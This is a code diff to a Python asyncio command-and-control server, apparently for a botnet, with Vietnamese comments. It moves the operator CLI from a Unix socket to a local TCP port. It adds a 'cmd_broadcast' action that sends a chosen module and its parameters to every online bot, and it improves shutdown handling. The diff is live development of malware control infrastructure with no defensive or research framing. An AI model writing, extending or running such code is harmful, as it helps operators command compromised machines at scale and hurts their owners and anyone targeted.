@@ -37,6 +37,7 @@ class CNCServer:
 
     async def start(self):
         self._running = True
+        self._stop_event = asyncio.Event()
 
         # Crypto
         key_hex = self.config["crypto"]["key"]
@@ -73,8 +74,9 @@ class CNCServer:
         self._tasks.append(asyncio.create_task(self._nonce_cleanup()))
 
         # CLI socket
-        cli_socket = self.config.get("server", {}).get("unix_socket", "/tmp/cnc.sock")
-        self._tasks.append(asyncio.create_task(self._cli_listener(cli_socket)))
+        cli_host = self.config.get("server", {}).get("cli_host", "127.0.0.1")
+        cli_port = self.config.get("server", {}).get("cli_port", 8444)
+        self._tasks.append(asyncio.create_task(self._cli_listener(cli_host, cli_port)))
 
         # Signal handlers
         for sig in (signal.SIGINT, signal.SIGTERM):
@@ -83,12 +85,16 @@ class CNCServer:
             except NotImplementedError:
                 signal.signal(sig, self._sync_signal_handler)
 
+        await self._stop_event.wait()
+
     async def stop(self):
         logger.info("Shutting down...")
         self._running = False
 
         for task in self._tasks:
             task.cancel()
+        if self._tasks:
+            await asyncio.gather(*self._tasks, return_exceptions=True)
         self._tasks.clear()
 
         if self._server:
@@ -96,6 +102,7 @@ class CNCServer:
             await self._server.wait_closed()
 
         await self._db.close()
+        self._stop_event.set()
         logger.info("CNC Server stopped")
 
     async def _heartbeat_checker(self):
@@ -118,15 +125,11 @@ class CNCServer:
                 pass
             await asyncio.sleep(300)
 
-    async def _cli_listener(self, path: str):
-        """Lắng nghe lệnh từ CLI qua Unix socket."""
+    async def _cli_listener(self, host: str, port: int):
+        """Lắng nghe lệnh từ CLI qua TCP."""
         try:
-            os.unlink(path)
-        except OSError:
-            pass
-        try:
-            server = await asyncio.start_unix_server(
-                lambda r, w: _handle_cli(r, w, self), path=path
+            server = await asyncio.start_server(
+                lambda r, w: _handle_cli(r, w, self), host, port
             )
             async with server:
                 await server.serve_forever()
@@ -196,6 +199,14 @@ async def _handle_cli(reader: asyncio.StreamReader, writer: asyncio.StreamWriter
             cmd_id = cnc._cmd_queue.enqueue(bot_id, module, params)
             await send({"ok": True, "cmd_id": cmd_id})
 
+        elif action == "cmd_broadcast":
+            module = req.get("module", "")
+            params = req.get("params", {})
+            bots = await cnc._db.list_bots()
+            online_bot_ids = [b["bot_id"] for b in bots if b["status"] == "online"]
+            results = cnc._cmd_queue.enqueue_all(online_bot_ids, module, params)
+            await send({"ok": True, "sent_to": len(results), "bot_ids": [bid for bid, _ in results]})
+
         elif action == "cmd_status":
             cmd_id = req.get("cmd_id", "")
             cmd = await cnc._db.get_command(cmd_id)
@@ -237,7 +248,6 @@ def main():
 
     try:
         asyncio.run(_server_instance.start())
-        # Keep running until stop() is called
     except KeyboardInterrupt:
         logger.info("KeyboardInterrupt received")
 
